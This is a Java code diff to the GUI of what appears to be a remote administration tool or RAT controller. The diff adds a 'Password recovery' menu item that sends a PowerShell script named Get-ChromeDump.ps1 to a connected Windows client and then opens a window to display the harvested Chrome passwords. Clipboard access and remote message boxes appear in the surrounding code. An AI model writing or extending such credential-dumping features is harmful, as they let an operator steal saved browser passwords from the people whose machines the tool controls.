@@ -20,7 +20,9 @@ import javafx.stage.DirectoryChooser;
 import javafx.stage.Stage;
 import javafx.stage.StageStyle;
 
+import java.io.BufferedInputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 
 class IPContextMenu implements Repository {
@@ -186,6 +188,43 @@ class IPContextMenu implements Repository {
         });
         clip.getItems().addAll(setClipboard, getClipboard);
 
+        //////// PWD recovery \\\\\\\\
+        Menu pwdRecovery = new Menu("Password recovery \u25B6");
+        MenuItem gatherChrome = new MenuItem("Gather Chrome Passwords (win only)");
+        gatherChrome.setOnAction(event -> {
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")){
+                if (!clientObject.getSYSTEM_OS().toLowerCase().contains("wind")){
+                    new AlertView().showErrorAlert("This module is for windows clients only.");
+                    return;
+                }
+                try {
+                    File script = new File(IPContextMenu.class.getResource("/scripts/Get-ChromeDump.ps1").getFile());
+
+                    clientObject.clientCommunicate("PSHMOD " + script.length() + " Get-ChromeDump");
+                    FileInputStream fis = new FileInputStream(IPContextMenu.class.getResource("/scripts/Get-ChromeDump.ps1").getFile());
+                    BufferedInputStream bis = new BufferedInputStream(fis);
+                    int fbyte;
+                    while ((fbyte = bis.read()) != -1){
+                        clientObject.clientCommunicate(fbyte);
+                    }
+                    fis.close();
+                    bis.close();
+
+                    Stage stage = new Stage();
+                    stage.initStyle(StageStyle.UNDECORATED);
+                    stage.setMinHeight(300);
+                    stage.setMinWidth(300);
+                    stage.setScene(new Scene(new ChromePassView().getChromePassView(stage), 800, 800));
+                    stage.show();
+                } catch (IOException ioe){
+                    ioe.printStackTrace();
+                }
+            } else {
+                new AlertView().showErrorAlert("Client is offline");
+            }
+
+        });
+        pwdRecovery.getItems().addAll(gatherChrome);
 
         //////// MISC \\\\\\\\
         Menu misc = new Menu("Misc      \u25B6");
@@ -251,7 +290,7 @@ class IPContextMenu implements Repository {
         });
         misc.getItems().addAll(visit, showMsgbox, sleep);
 
-        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, clip, misc);
+        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, clip, pwdRecovery, misc);
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
             final Clipboard clipboard = Clipboard.getSystemClipboard();
